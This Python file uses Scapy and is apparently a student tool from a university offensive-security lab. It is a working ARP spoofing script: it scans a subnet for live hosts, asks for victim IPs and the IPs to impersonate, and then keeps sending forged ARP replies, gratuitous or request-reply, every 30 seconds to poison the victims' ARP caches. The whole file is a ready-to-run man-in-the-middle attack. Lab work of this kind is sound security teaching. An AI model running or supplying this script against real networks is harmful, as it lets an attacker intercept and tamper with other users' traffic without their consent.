from scapy.all import * 
import time

print ( '\033[95m' +"        2IC80 Lab on offensive computer security        ")
print ( '\033[95m' +"                Group 44 2021/2022 TU/e                 ")
print ( '\033[0m'  +"--------------------------------------------------------")

def spoofedPkt(macVictim, ipVictim, ipToSpoof, interface):
    arp= Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker        
    arp[ARP].psrc = ipToSpoof            
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim           

    sendp(arp, loop = 0, iface=interface) # send one time the arp pkt 

def gratutiousARP(macVictim, ipVictim, ipToSpoof, interface):
    #arp response that was not prompt by arp request
    arp= Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker        
    arp[ARP].psrc = ipToSpoof            
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim 
    arp[ARP].op = "is-at"
    print("MacVictim: ", macVictim)
    
    sendp(arp, loop = 0, iface=interface) # send one time the arp pkt 

interface = raw_input("Input interface, for example enp0s9: ")  

hosts = arping("10.0.2.0/24") #checks which IPs in the range: 10.0.2.0/24
dictIPMAC = {}
for i in range(len(hosts[0])): #hosts[0] contains the answers form the hosts that are up
    dictIPMAC[hosts[0][i][1][ARP].psrc] = hosts[0][i][1][ARP].hwsrc
    print("Host ", hosts[0][i][1][ARP].psrc, "is up") 
    
print ( '\033[0m'  +"--------------------------------------------------------")
print("How many hosts arp tables do you want to spoof: ")
inputNumber = int(input())

ipVictims = []
ipsToBeSpoofed = []
for i in range(inputNumber):
    print("Insert the IP of victim ", i, " (Press Enter)")
    ipVictim = raw_input()    
    ipVictims.append(ipVictim)
    print("Insert the IP that will be spoofed in victims arp table")
    ipToBeSpoof = raw_input()
    ipsToBeSpoofed.append(ipToBeSpoof)

print("You want to poision the arp tables of ", ipVictims)

mode = raw_input("Input silent for gratutions poisoning or all-out for request-reply: ")

macAttacker = "08:00:27:96:ae:0b"            
ipAttacker = "10.0.2.5"

while True:
    for i in range(len(ipVictims)):
        macVictim = dictIPMAC[ipVictims[i]]
        ipVictim = ipVictims[i]
        ipToSpoof = ipsToBeSpoofed[i]
        if mode == "silent":
            gratutiousARP(macVictim, ipVictim, ipToSpoof, interface)
        else:    
            spoofedPkt(macVictim, ipVictim, ipToSpoof, interface)
    time.sleep(30)    
